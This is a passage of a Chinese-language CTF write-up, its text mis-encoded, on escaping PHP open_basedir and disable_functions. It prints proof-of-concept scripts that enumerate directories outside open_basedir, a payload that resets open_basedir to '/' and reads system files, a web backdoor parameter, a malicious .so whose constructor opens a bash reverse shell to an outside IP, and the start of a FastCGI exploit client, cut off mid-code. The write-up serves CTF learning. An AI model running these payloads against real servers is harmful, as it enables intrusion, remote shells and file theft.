ä¸è¿‡è¿™é‡Œçš„æµ‹è¯•æ˜¯åœ¨linuxç¯å¢ƒä¸‹æ‰å¯ä»¥çš„ï¼Œå¹¶ä¸”è¿˜æœ‰ä¸€ä¸ªç¼ºç‚¹å°±æ˜¯è¦æ±‚phpç‰ˆæœ¬ä¸º5.3ä»¥ä¸Šï¼Œä½†pç¥åˆè¯´5.5/5.6å¯èƒ½æœ‰ä¿®å¤ï¼Œä½†è¿˜æ²¡çœ‹åˆ°ã€‚ã€‚ã€‚è¿™é‡Œå…ˆä¸ç®¡äº† realpathåˆ—ä¸¾ç›®å½• è¿™ä¸ªrealpathå‡½æ•°æ˜¯phpä¸­å°†ä¸€ä¸ªè·¯å¾„è§„èŒƒåŒ–æˆä¸ºç»å¯¹è·¯å¾„çš„æ–¹æ³•ï¼Œå®ƒå¯ä»¥å»æ‰å¤šä½™çš„â€¦/æˆ–./ç­‰è·³è½¬å­—ç¬¦ï¼Œèƒ½å°†ç›¸å¯¹è·¯å¾„è½¬æ¢æˆç»å¯¹è·¯å¾„ã€‚ åœ¨å¼€å¯äº†open_basedirä»¥åï¼Œè¿™ä¸ªå‡½æ•°æœ‰ä¸ªç‰¹ç‚¹ï¼šå½“æˆ‘ä»¬ä¼ å…¥çš„è·¯å¾„æ˜¯ä¸€ä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶ï¼ˆç›®å½•ï¼‰æ—¶ï¼Œå®ƒå°†è¿”å›falseï¼›å½“æˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªä¸åœ¨open_basediré‡Œçš„æ–‡ä»¶ï¼ˆç›®å½•ï¼‰ï¼Œä½†è¯¥æ–‡ä»¶ï¼ˆç›®å½•ï¼‰æ˜¯å­˜åœ¨çš„è¯ï¼Œä»–å°†æŠ›å‡ºé”™è¯¯ï¼ˆFile is not within the allowed path(s)ï¼‰ã€‚ é‚£è¿™å¾ˆæ˜æ˜¾äº†ï¼Œæˆ‘ä»¬åªéœ€è¦åˆ¤æ–­æŠ¥é”™ä¿¡æ¯ï¼Œå°±å¯ä»¥å¾—åˆ°è¯¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨äº†ï¼Œä¹Ÿå°±æ˜¯æš´åŠ›ç ´è§£ï¼Œè¿™ä¸ªé”™è¯¯ä¿¡æ¯ç”¨err_handle()å‡½æ•°æ•æ‰ï¼šå½“çŒœè§£æŸä¸ªå­˜åœ¨çš„æ–‡ä»¶æ—¶ï¼Œä¼šå› æŠ›å‡ºé”™è¯¯è€Œè¿›å…¥err_handle()ï¼Œå½“çŒœè§£æŸä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶æ—¶ï¼Œå°†ä¸ä¼šè¿›å…¥err_handle()ã€‚ ä½†ç¼ºç‚¹å°±æ˜¯æ•ˆç‡å¤ªä½ï¼Œä¸Šåƒä¸‡æ¬¡æ‰å¯ä»¥è·‘å®Œï¼Œè¿™è‚¯å®šä¸è¡Œçš„ï¼Œä½†pç¥è¿™æ—¶å€™å°±æƒ³åˆ°äº†windowsä¸‹çš„é€šé…ç¬¦ï¼š&lt;ã€&gt; è¿™é‡Œå°±æ‡µé€¼äº†ï¼Œwindowsä¸‹é€šé…ç¬¦ä¸æ˜¯?ã€*å—ï¼Œè¿™ä¸¤ä¸ªç¬¦å·æ˜¯ä»€ä¹ˆé¬¼ï¼Œéšåçœ‹åˆ°è¯„è®ºåŒºpç¥è®©æˆ‘ä»¬çœ‹çœ‹è¿™ä¸ªæ¼æ´ wooyun-2014-071540 ä¸Šè¿°æ ‡è®°å¤„ä»–æ‰“é”™äº†ï¼Œè¿™é‡Œè¯´åœ¨php+windows+iisç¯å¢ƒä¸‹è¿™ä¸¤ä¸ªç¬¦å·å¯ä»¥ç­‰ä»·äºé€šé…ç¬¦ï¼Œå—·å¼ï¼Œæ€ªä¸å¾—ï¼Œpayloadå¦‚ä¸‹ &lt;?php ini_set('open_basedir', dirname(__FILE__));//è·å–php.iniä¸­çš„open_basedirä¿¡æ¯ printf(\"&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;\", ini_get('open_basedir'));//å°†å…¶éå†æ‰“å°å‡ºæ¥ set_error_handler('isexists'); $dir = 'd:/test/'; $file = ''; $chars = 'abcdefghijklmnopqrstuvwxyz0123456789_'; for ($i=0; $i &lt; strlen($chars); $i++) { $file = $dir . $chars[$i] . '&lt;&gt;&lt;'; realpath($file);//å°†æ‰€æœ‰è‡ªå®šä¹‰å¾—åˆ°çš„æ–‡ä»¶ç»å¯¹è·¯å¾„ä¼ å…¥åˆ°å…¶ä¸­ï¼Œå®ƒä¼šæ ¹æ®æ˜¯å¦å­˜åœ¨è€Œé€‰æ‹©æŠ¥é”™ä¸å¦ï¼Œç´§æ¥ç€å°±ä¼šè§¦å‘isexists } function isexists($errno, $errstr) { $regexp = '/File\\((.*)\\) is not within/';//åŒ¹é…File xxx is not withinçš„æ–‡æœ¬ preg_match($regexp, $errstr, $matches); if (isset($matches[1])) { printf(\"%s &lt;br/&gt;\", $matches[1]);//å¦‚æœåŒ¹é…åˆ°åˆ™å°†åŒ¹é…åˆ°çš„å†…å®¹æ‰“å°å‡ºæ¥ } } ?&gt; æ‰§è¡Œå¯ä»¥çœ‹åˆ°ï¼š Open_basedirä¸ºc:\\wamp\\wwwï¼Œä½†æˆ‘ä»¬åˆ—ä¸¾å‡ºäº†d:/test/ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œä¸è¿‡åªèƒ½åˆ—ä¸¾å‡ºé¦–å­—æ¯ä¸åŒçš„æ–‡ä»¶ï¼Œé¦–å­—æ¯ç›¸åŒçš„è¯ï¼Œå°±éœ€è¦æ·»åŠ ç¬¬äºŒä¸ªå­—ç¬¦å†æ¥ç€æšä¸¾ã€ç¬¬ä¸‰ä¸ªå­—ç¬¦etcâ€¦ è¿™ä¸ªæ–¹æ³•å¥½å¤„æ˜¯windowsä¸‹phpæ‰€æœ‰ç‰ˆæœ¬é€šç”¨ï¼Œå½“ç„¶åå¤„å°±æ˜¯åªæœ‰windowsä¸‹æ‰èƒ½ä½¿ç”¨é€šé…ç¬¦ï¼Œå¦‚æœæ˜¯linuxä¸‹å°±åªèƒ½æš´åŠ›çŒœè§£äº†ã€‚ SplFileInfo::getRealPathåˆ—ä¸¾ç›®å½• è¿™æ—¶pç¥åˆåœ¨æƒ³ï¼Œå¦‚æœæˆ‘ä»¬çš„realpathè¢«banäº†è¯¥å¦‚ä½•ï¼Œéšåä»–åœ¨PHP5.1.2ä¹‹åæ‰¾åˆ°äº†ä¸€ä¸ªæ–°å¼•å…¥çš„ç±»ï¼ŒSplFileInfoï¼Œå…¶æä¾›ä¸€ä¸ªå¯¹æ–‡ä»¶è¿›è¡Œæ“ä½œçš„æ¥å£ï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªgetRealPathæ–¹æ³•ä¸realpathå¾ˆåƒï¼Œéƒ½æ˜¯è·å–ç»å¯¹è·¯å¾„ç”¨çš„ã€‚ä½†åŒºåˆ«ç‚¹åœ¨äºè¿™ä¸ªgetRealPathæ–¹æ³•æ˜¯å®Œå…¨æ— è§†open_basedirå­˜åœ¨çš„ï¼Œå½“æˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªä¸å­˜åœ¨çš„è·¯å¾„æ—¶ï¼Œä¼šè¿”å›falseï¼Œå½“è¯¥è·¯å¾„å­˜åœ¨æ—¶ï¼Œä»–ä¼šç›´æ¥è¿”å›æ­£å¸¸çš„ç»å¯¹è·¯å¾„ï¼Œæ¥ä¸‹æ¥çœ‹pç¥çš„pocï¼š &lt;?php ini_set('open_basedir', dirname(__FILE__)); printf(\"&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;\", ini_get('open_basedir')); $basedir = 'D:/test/'; $arr = array(); $chars = 'abcdefghijklmnopqrstuvwxyz0123456789'; for ($i=0; $i &lt; strlen($chars); $i++) { $info = new SplFileInfo($basedir . $chars[$i] . '&lt;&gt;&lt;');//å°†æ„é€ çš„è·¯å¾„ä¼ å…¥è¯¥ç±»ï¼Œå¹¶å®ä¾‹åŒ– $re = $info-&gt;getRealPath();//è°ƒç”¨getrealpathæ–¹æ³•ï¼Œå°è¯•è·å–ç»å¯¹è·¯å¾„ if ($re) { dump($re);//å¦‚æœå­˜åœ¨ï¼Œåˆ™è½¬åˆ°dumpå‡½æ•°è¿›è¡Œå¤„ç† } } function dump($s){ echo $s . '&lt;br/&gt;';//è¾“å‡ºå¾—åˆ°çš„æ–‡ä»¶ç»å¯¹è·¯å¾„ ob_flush(); flush(); } ?&gt; è¿™é‡Œé™„ä¸Šå¯¹ob_flush()ä¸flush()çš„è§£é‡Šï¼š è¿™ä¸ª dump å‡½æ•°å¯èƒ½ä¸»è¦ç”¨äºè°ƒè¯•ç›®çš„ï¼Œå½“å¼€å‘è€…æƒ³è¦å¾—åˆ°å®æ—¶è¾“å‡ºå¹¶å³æ—¶è§‚å¯Ÿè„šæœ¬æ‰§è¡Œä¿¡æ¯æ—¶ã€‚åœ¨è„šæœ¬æ‰§è¡ŒæœŸé—´ï¼Œè¾“å‡ºé€šå¸¸ä¼šç¼“å­˜èµ·æ¥ï¼Œç›´åˆ°è¾¾åˆ°ä¸€å®šé‡æˆ–è„šæœ¬æ‰§è¡Œå®Œæ¯•åä¸€æ¬¡æ€§å‘é€åˆ°æµè§ˆå™¨ã€‚é€šè¿‡ä½¿ç”¨ ob_flush() å’Œ flush()ï¼Œå¼€å‘è€…å¯ä»¥å¼ºåˆ¶ç«‹å³è¾“å‡ºæ•°æ®ï¼Œè¿™å¯¹äºç›‘è§†é•¿æ—¶é—´è¿è¡Œçš„è„šæœ¬éå¸¸æœ‰ç”¨ã€‚ åŒæ ·å¯ä»¥åˆ—ä¸¾ï¼Œè¿™ä¸ªæ–¹æ³•æœ‰ä¸ªç‰¹ç‚¹ï¼Œä¸ç®¡æ˜¯å¦å¼€å¯open_basediréƒ½æ˜¯å¯ä»¥æšä¸¾ä»»æ„ç›®å½•çš„ã€‚è€Œä¸Šä¸€ä¸ªæ–¹æ³•ï¼ˆrealpathï¼‰åªæœ‰åœ¨å¼€å¯open_basedirä¸”åœ¨open_basedirå¤–çš„æ—¶å€™æ‰ä¼šæŠ¥é”™ï¼Œæ‰èƒ½åˆ—ä¸¾ç›®å½•ã€‚å½“ç„¶ï¼Œæ²¡æœ‰å¼€å¯open_basedirçš„æ—¶å€™ä¹Ÿä¸éœ€è¦è¿™æ ·åˆ—ä¸¾ç›®å½•äº†ã€‚ GDåº“imageftbbox/imagefttextåˆ—ä¸¾ç›®å½• GDåº“ä¸€èˆ¬æ˜¯PHPå¿…å¤‡çš„æ‹“å±•åº“ä¹‹ä¸€ï¼Œè¿™é‡Œæˆ‘ä»¬çœ‹pç¥çš„åˆ†æï¼š æˆ‘æ‹¿imageftbboxä¸¾ä¸ªä¾‹å­ï¼Œè¿™ä¸ªå‡½æ•°ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯å­—ä½“çš„è·¯å¾„ã€‚æˆ‘å‘ç°å½“è¿™ä¸ªå‚æ•°åœ¨open_basedirå¤–çš„æ—¶å€™ï¼Œå½“æ–‡ä»¶å­˜åœ¨ï¼Œåˆ™phpä¼šæŠ›å‡ºâ€œFile(xxxxx) is not within the allowed path(s)â€é”™è¯¯ã€‚ä½†å½“æ–‡ä»¶ä¸å­˜åœ¨çš„æ—¶å€™ä¼šæŠ›å‡ºâ€œInvalid font filenameâ€é”™è¯¯ã€‚ è¿™å¾ˆæ¸…æ™°äº†ï¼Œç‰¹ç‚¹ç±»ä¼¼äºrealpathï¼Œçœ‹pocï¼š &lt;?php ini_set('open_basedir', dirname(__FILE__)); printf(\"&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;\", ini_get('open_basedir')); set_error_handler('isexists'); $dir = 'd:/test/'; $file = ''; $chars = 'abcdefghijklmnopqrstuvwxyz0123456789_'; for ($i=0; $i &lt; strlen($chars); $i++) { $file = $dir . $chars[$i] . '&lt;&gt;&lt;'; //$m = imagecreatefrompng(\"zip.png\"); //imagefttext($m, 100, 0, 10, 20, 0xffffff, $file, 'aaa'); imageftbbox(100, 100, $file, 'aaa');//å°†æ„é€ çš„æ–‡ä»¶è·¯å¾„ä¼ ç»™imageftbboxæ–¹æ³•ï¼Œå‡ºé”™çš„è¯åˆ™ä¼šè°ƒç”¨isexistsæ–¹æ³• } function isexists($errno, $errstr) { global $file; if (stripos($errstr, 'Invalid font filename') === FALSE) { printf(\"%s&lt;br/&gt;\", $file);//å¦‚æœæŠ¥é”™ä¿¡æ¯ä¸æ˜¯Invalid font filenameçš„è¯ï¼Œåˆ™è¾“å…¥æ–‡ä»¶è·¯å¾„ } } ?&gt; æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æˆåŠŸçˆ†å‡ºï¼Œä½†å´åªèƒ½çˆ†å‡ºä¸€ä¸ªå­—ç¬¦ï¼Œä½†æ³¨æ„çš„æ˜¯è¿™é‡Œçš„ç‰¹æ®Šé€šé…ç¬¦æ˜¯èµ·äº†ä½œç”¨çš„ï¼Œåªä¸è¿‡åœ¨æœ€ç»ˆè¾“å‡ºçš„æ—¶å€™é€šé…ç¬¦å¹¶æ²¡æœ‰è½¬æ¢ä¸ºç›¸åº”çš„å­—ç¬¦ã€‚å› æ­¤è¿™ç§æ–¹æ³•æ¯”realpathéº»çƒ¦çš„ç‚¹åœ¨äºï¼Œéœ€è¦ä¸€ä½ä¸€ä½çˆ†ç ´ã€‚ bindtextdomainæš´åŠ›çŒœè§£ç›®å½• å…ˆçœ‹pç¥çš„åˆ†æï¼š bindtextdomainæ˜¯phpä¸‹ç»‘å®šdomainåˆ°æŸä¸ªç›®å½•çš„å‡½æ•°ã€‚å…·ä½“è¿™ä¸ªdomainæ˜¯ä»€ä¹ˆæˆ‘ä¹Ÿæ²¡å…·ä½“ç”¨è¿‡ï¼Œåªæ˜¯åœ¨ä¸€äº›l10nåº”ç”¨ä¸­å¯èƒ½ç”¨åˆ°çš„æ–¹æ³•ï¼ˆç›¸å…³å‡½æ•°textdomainã€gettextã€setlocaleï¼Œè¯´æ˜ï¼šhttp://php.net/manual/en/function.gettext.phpï¼‰ Bindtextdomainå‡½æ•°åœ¨ç¯å¢ƒæ”¯æŒGettext Functionsçš„æ—¶å€™æ‰èƒ½ä½¿ç”¨ï¼Œè€Œæˆ‘çš„windowsç¯å¢ƒä¸‹æ˜¯æ²¡æœ‰bindtextdomainå‡½æ•°çš„ï¼Œæˆ‘çš„linuxç¯å¢ƒæ˜¯é»˜è®¤å­˜åœ¨è¿™ä¸ªå‡½æ•°ã€‚ è¿™ä¸ªå‡½æ•°çš„ç‰¹ç‚¹åœ¨äºç¬¬äºŒä¸ªå‚æ•°directoryï¼Œå¦‚æœæ–‡ä»¶è·¯å¾„å­˜åœ¨åˆ™è¿”å›å…·ä½“çš„è·¯å¾„ï¼Œä¸å­˜åœ¨åˆ™è¿”å›falseï¼Œpocå¦‚ä¸‹ &lt;?php printf('&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;', ini_get('open_basedir')); $re = bindtextdomain('xxx', $_GET['dir']); var_dump($re); ?&gt; è¿™é‡Œå¯ä»¥çœ‹åˆ°ä¾æ—§å¯ä»¥ç»•è¿‡open_basedirï¼Œç¼ºç‚¹åœ¨äºåªèƒ½åœ¨linuxç¯å¢ƒä¸‹æ‰å¯ä»¥ï¼Œä½†åœ¨linuxä¸‹åˆä¸èƒ½ä½¿ç”¨é€šé…ç¬¦æ¥çŒœè§£ç›®å½•ï¼Œæ‰€ä»¥è¿™æ˜¯ä¸€ä¸ªæ²¡æœ‰åŠæ³•çš„åŠæ³•ã€‚ã€‚ã€‚ã€‚ è¿™é‡Œé™„ä¸Šlinuxä¸‹åˆä¸èƒ½ä½¿ç”¨é€šé…ç¬¦æ¥çŒœè§£ç›®å½•çš„åŸå› ï¼š åœ¨Linuxç³»ç»Ÿä¸­ï¼Œé€šè¿‡æ­£å¸¸çš„shellç¯å¢ƒä¸­ä½¿ç”¨é€šé…ç¬¦ï¼ˆå¦‚ * å’Œ ?ï¼‰æ¥è¿›è¡Œæ–‡ä»¶åŒ¹é…å’Œç®€å•çš„æ¨¡å¼åŒ¹é…é€šå¸¸æ˜¯å¯è¡Œçš„ã€‚ç„¶è€Œï¼Œé€šé…ç¬¦é€šå¸¸ä¸ç”¨äºâ€œçŒœè§£â€ï¼ˆæˆ–ç§°æšä¸¾ï¼‰ç›®å½•ï¼Œå› ä¸ºshellé€šé…ç¬¦çš„åŒ¹é…è§„åˆ™å¹¶ä¸æ”¯æŒçŒœè§£ç›®å½•ç»“æ„ä¸­æœªçŸ¥çš„éƒ¨åˆ†ã€‚ ä¾‹å¦‚ï¼Œ* å¯ç”¨äºåŒ¹é…ä»»æ„æ•°é‡çš„å­—ç¬¦ï¼Œè€Œ ? å¯åŒ¹é…ä»»æ„å•ä¸ªå­—ç¬¦ã€‚è¿™äº›é€šé…ç¬¦å¯ä»¥åŒ¹é…å·²çŸ¥æ¨¡å¼çš„æ–‡ä»¶å’Œç›®å½•åç§°ï¼Œä½†å®ƒä»¬æ— æ³•ç”¨æ¥å‘ç°ç³»ç»Ÿä¸ŠæœªçŸ¥æˆ–éšè—çš„ç›®å½•ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä½ ä¸èƒ½é€šè¿‡å®ƒä»¬æ¥çŒœè§£ç”±æœªçŸ¥å­—ç¬¦ç»„æˆçš„ç›®å½•åç§°ã€‚ ?backdoor=file_put_contents('basedir.php', '&lt;?php printf(\\'&lt;b&gt;open_basedir : %s &lt;/b&gt;&lt;br /&gt;\\', ini_get(\\'open_basedir\\'));$file_list = array();$it = new DirectoryIterator(\"glob:///*\");foreach ($it as $f) {$file_list[] = $f-&gt;__toString();}$it = new DirectoryIterator(\"glob:///.*\");foreach($it as $f) {$file_list[] = $f-&gt;__toString();}sort($file_list);foreach ($file_list as $f) {echo \"{$f}&lt;br/&gt;\";}?&gt;'); è¿™é‡Œæˆ‘ä»¬å¯ä»¥é€šè¿‡pç¥çš„ç¬¬ä¸€ä¸ªglobåè®®çš„åŠæ³•æ¥ç»•è¿‡ï¼Œè¿™é‡Œæˆ‘æ˜¯åœ¨é¶æœºé¡µé¢ä¼ å…¥çš„pocæœ‰ç‚¹éº»çƒ¦è¿˜éœ€è¦æ³¨æ„ç¬¦å·çš„è½¬ä¹‰ï¼Œå¤§å®¶å¯ä»¥èšå‰‘è¿æ¥åœ¨htmlä¸‹å†™å…¥æ–‡ä»¶å³å¯ï¼Œå› æ­¤htmlä¸‹æ˜¯å¯ä»¥è¿›è¡Œè¯»å†™çš„ã€‚ å¦‚ä¸Šå›¾çœ‹åˆ°äº†æ ¹ç›®å½•ä¸‹å­˜åœ¨flagï¼Œé‚£æ¥ä¸‹æ¥å°±æ˜¯è¯»å–äº†ï¼Œä½†æˆ‘ä»¬å¦‚ä½•ç»•è¿‡disable_functionså‘¢ï¼Œåˆæ˜¯ä¸€ä¸ªæ²¡å­¦è¿‡çš„å§¿åŠ¿ã€‚ã€‚ã€‚ã€‚å‘ç°è¿™ä¸ªé¢˜ç›®æ²¡å­¦è¿‡çš„çŸ¥è¯†è¿˜æ˜¯å¾ˆå¤šçš„ï¼Œæˆ‘ä¾æ—§éœ€è¦å¦èµ·æ–‡ç« å»å­¦ä¹ ï¼Œé‚£æ¥ä¸‹æ¥æˆ‘ä»¬å…ˆå¤ç°å®Œæ•´è¿™ä¸ªé¢˜ç›®å†è¯´ï¼Œæœ‰ç‚¹èµ°è¿œäº†ã€‚ã€‚ã€‚ã€‚ æ€»çš„æ¥è¯´æˆ‘ä»¬æƒ³è¦è¯»å–æ–‡ä»¶çš„è¯ï¼Œå°±æ˜¯éœ€è¦å¯¹open_basedirè¿›è¡Œä¿®æ”¹ï¼Œä½†å¦‚ä½•ä¿®æ”¹å‘¢ï¼Œè¿™é‡Œæˆ‘ç›´æ¥ä¸Špayloadï¼ŒåŸç†ä¼šåœ¨å…¶ä»–æ–‡ç« å­¦ä¸€ä¸‹ï¼ˆä¸è¿‡çœ‹äº†çœ‹åŸç†ï¼Œæ˜¯PHPåº•å±‚çš„ã€‚ã€‚ã€‚ï¼‰ mkdir('sub');chdir('sub');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(scandir('/')); é€šè¿‡å¦‚ä¸Špayloadæˆ‘ä»¬å¯ä»¥é‡æ–°è®¾ç½®open_basedirå¯¹å…¶è¿›è¡Œè¦†ç›– å¦‚å›¾å¯ä»¥åˆ—ä¸¾å‡ºç›®å½•ï¼Œæ¥ä¸‹æ¥ä¾æ—§æ˜¯è¯»å–ï¼Œé‚£å°±æ˜¯file_get_contentså‡½æ•°äº†ï¼Œä½†æˆ‘ä»¬å·²ç»æµ‹è¯•è¿‡è¿™æ˜¯è¡Œä¸é€šçš„ï¼Œçœ‹äº†wpè¯´æ˜¯è¿™é‡Œæ˜¯æƒé™ä¸å¤Ÿï¼Œéœ€è¦ææƒï¼Œä½†å¦‚ä½•ææƒå‘¢ï¼ˆæˆ‘ä¹Ÿä¸çŸ¥é“~~~ï¼‰ï¼Œè¿™é‡Œå¸ˆå‚…ä»¬è¯´å¯ä»¥é€šè¿‡åŠ è½½æ¶æ„soæ–‡ä»¶ï¼Œä½†å¦‚ä½•åŠ è½½å‘¢ï¼Œè¿™é‡Œå°±éœ€è¦å›åˆ°æœ€åˆæˆ‘ä»¬çœ‹åˆ°çš„FastCGIäº†ï¼Œæ—¢ç„¶å¼€å¯äº†FastCGIé‚£æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡å¼€å¯æ¶æ„ftpæœåŠ¡ï¼Œè®©é¶æœºæ¥è®¿é—®æˆ‘ä»¬çš„æœåŠ¡ï¼Œæœ€ç»ˆå°†æ¶æ„soæ–‡ä»¶ä¸Šä¼ åˆ°é¶æœºã€‚ mkdir('sub');chdir('sub');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(file_get_contents('/usr/local/etc/php/php.ini')); å¦‚ä¸Šå›¾è¿™é‡Œåº”è¯¥æ˜¯è¯´æ˜å¯ä»¥è¿›è¡ŒåŠ è½½.soæ–‡ä»¶ï¼Œé‚£æˆ‘ä»¬å¯ä»¥æ„é€ æ¶æ„çš„.soæ–‡ä»¶è¿›å»ï¼Œæ¥ä¸‹æ¥å°±æ˜¯è¯»å–å…³äºFastCGIæœåŠ¡çš„ä¸€äº›é…ç½®ä¿¡æ¯äº†/etc/nginx è¯»å–nginx.confï¼Œå‘ç°å¦‚ä¸‹ä¸¤ä¸ªå¯ä»¥è·¯å¾„ï¼Œæˆ‘ä»¬å…ˆçœ‹çœ‹sites æˆåŠŸåœ¨/etc/nginx/sites-enabled/defaultè¯»å–åˆ°è¯¦ç»†ä¿¡æ¯ server { listen 80 default_server; listen [::]:80 default_server; # SSL configuration # # listen 443 ssl default_server; # listen [::]:443 ssl default_server; # # Note: You should disable gzip for SSL traffic. # See: https://bugs.debian.org/773332 # # Read up on ssl_ciphers to ensure a secure configuration. # See: https://bugs.debian.org/765782 # # Self signed certs generated by the ssl-cert package # Don't use them in a production server! # # include snippets/snakeoil.conf; root /var/www/html; # Add index.php to the list if you are using PHP index index.php index.html index.htm index.nginx-debian.html; server_name _; location / { # First attempt to serve request as file, then # as directory, then fall back to displaying a 404. try_files $uri $uri/ =404; } # pass PHP scripts to FastCGI server # location ~ \\.php$ { root html; fastcgi_pass 127.0.0.1:9001; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME /var/www/html/$fastcgi_script_name; include fastcgi_params; } # deny access to .htaccess files, if Apache's document root # concurs with nginx's one # #location ~ /\\.ht { #\tdeny all; #} } è¿™é‡Œçœ‹åˆ°å…¶FastCGIå¼€åœ¨äº†9001ç«¯å£ï¼Œæ¥ä¸‹æ¥å°±æ˜¯å†™æ¶æ„ftpæœåŠ¡äº†ï¼Œå†™ä¹‹å‰å…ˆå‡†å¤‡å¥½.soæ–‡ä»¶ï¼ˆä¸‹é¢çœ‹çš„wpï¼‰ //é¦–å…ˆä½¿ç”¨ä»¥ä¸‹cæ–‡ä»¶ hpdoger.c ç¼–è¯‘ä¸€ä¸ªæ¶æ„çš„ .so æ‰©å±•ï¼Œè¿™é‡Œç›´æ¥ç”¨ç½‘ä¸Šäº˜å¤ä¸å˜çš„å†™æ³•ï¼š #define _GNU_SOURCE #include &lt;stdlib.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; __attribute__ ((__constructor__)) void preload (void){ system(\"bash -c 'bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1'\"); } é€šè¿‡ shared å‘½ä»¤ç¼–è¯‘ï¼š gcc hpdoger.c -fPIC -shared -o hpdoger.so ä¹‹åä¸Šä¼ åˆ°é¶æœºçš„htmlç›®å½•ä¸‹å³å¯ è¿™é‡Œä½¿ç”¨çš„wgetä¸‹è½½ æ„é€ FastCGIè¯·æ±‚PHP-CGI è¿™é‡Œç”¨gopherusçš„è¯è¿˜éœ€è¦ä¿®æ”¹å¾ˆå¤šä¸œè¥¿ï¼Œå› æ­¤ç›´æ¥ä¿®æ”¹expäº†ï¼šfcgi_jailbreak.php &lt;?php /** * Note : Code is released under the GNU LGPL * * Please do not change the header of this file * * This library is free software; you can redistribute it and/or modify it under the terms of the GNU * Lesser General Public License as published by the Free Software Foundation; either version 2 of * the License, or (at your option) any later version. * * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. * * See the GNU Lesser General Public License for more details. */ /** * Handles communication with a FastCGI application * * @author Pierrick Charron &lt;pierrick@webstart.fr&gt; * @version 1.0 */ class FCGIClient { const VERSION_1 = 1; const BEGIN_REQUEST = 1; const ABORT_REQUEST = 2; const END_REQUEST = 3; const PARAMS = 4; const STDIN = 5; const STDOUT = 6; const STDERR = 7; const DATA = 8; const GET_VALUES = 9; const GET_VALUES_RESULT = 10; const UNKNOWN_TYPE = 11; const MAXTYPE = self::UNKNOWN_TYPE; const RESPONDER = 1; const AUTHORIZER = 2; const FILTER = 3; const REQUEST_COMPLETE = 0; const CANT_MPX_CONN = 1; const OVERLOADED = 2; const UNKNOWN_ROLE = 3; const MAX_CONNS = 'MAX_CONNS'; const MAX_REQS = 'MAX_REQS'; const MPXS_CONNS = 'MPXS_CONNS'; const HEADER_LEN = 8; /** * Socket * @var Resource */ private $_sock = null; /** * Host * @var String */ private $_host = null; /** * Port * @var Integer */ private $_port = null; /** * Keep Alive * @var Boolean */ private $_keepAlive = false; /** * Constructor * * @param String $host Host of the FastCGI application * @param Integer $port Port of the FastCGI application */ public function __construct($host, $port = 9001) // and default value for port, just for unixdomain socket { $this-&gt;_host = $host; $this-&gt;_port = $port; } /** * Define whether or not the FastCGI application should keep the connection * alive at the end of a request * * @param Boolean $b true if the connection should stay alive, false otherwise */ public function setKeepAlive($b) { $this-&gt;_keepAlive = (boolean)$b; if (!$this-&gt;_keepAlive &amp;&amp; $this-&gt;_sock) { fclose($this-&gt;_sock); } } /** * Get the keep alive status * * @return Boolean true if the connection should stay alive, false otherwise */ public function getKeepAlive() { return $this-&gt;_keepAlive; } /** * Create a connection to the FastCGI application */ private function connect() { if (!$this-&gt;_sock) { //$this-&gt;_sock = fsockopen($this-&gt;_host, $this-&gt;_port, $errno, $errstr, 5); $this-&gt;_sock = stream_socket_client($this-&gt;_host, $errno, $errstr, 5); if (!$this-&gt;_sock) { throw new Exception('Unable to connect to FastCGI application'); } } } /** * Build a FastCGI packet * * @param Integer $type Type of the packet * @param String $content Content of the packet * @param Integer $requestId RequestId */ private function buildPacket($type, $content, $requestId = 1) { $clen = strlen($content); return chr(self::VERSION_1) /* version */ . chr($type) /* type */ . chr(($requestId &gt;&gt; 8) &amp; 0xFF) /* requestIdB1 */ . chr($requestId &amp; 0xFF) /* requestIdB0 */ . chr(($clen &gt;&gt; 8 ) &amp; 0xFF) /* contentLengthB1 */ . chr($clen &amp; 0xFF) /* contentLengthB0 */ . chr(0) /* paddingLength */ . chr(0) /* reserved */ . $content; /* content */ } /** * Build an FastCGI Name value pair * * @param String $name Name * @param String $value Value * @return String FastCGI Name value pair */ private function buildNvpair($name, $value) { $nlen = strlen($name); $vlen = strlen($value); if ($nlen &lt; 128) { /* nameLengthB0 */ $nvpair = chr($nlen); } else { /* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */ $nvpair = chr(($nlen &gt;&gt; 24) | 0x80) . chr(($nlen &gt;&gt; 16) &amp; 0xFF) . chr(($nlen &gt;&gt; 8) &amp; 0xFF) . chr($nlen &amp; 0xFF); } if ($vlen &lt; 128) { /* valueLengthB0 */ $nvpair .= chr($vlen); } else { /* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */ $nvpair .= chr(($vlen &gt;&gt; 24) | 0x80) . chr(($vlen &gt;&gt; 16) &amp; 0xFF) . chr(($vlen &gt;&gt; 8) &amp; 0xFF) . chr($vlen &amp; 0xFF); } /* nameData &amp; valueData */ return $nvpair . $name . $value; } /** * Read a set of FastCGI Name value pairs * * @param String $data Data containing the set of FastCGI NVPair * @return array of NVPair */ private function readNvpair($data, $length = null) { $array = array(); if ($length === null) { $length = strlen($data); } $p = 0; while ($p != $length) { $nlen = ord($data{$p++}); if ($nlen &gt;= 128) { $nlen = ($nlen &amp; 0x7F &lt;&lt; 24); $nlen |= (ord($data{$p++}) &lt;&lt; 16); $nlen |= (ord($data{$p++}) 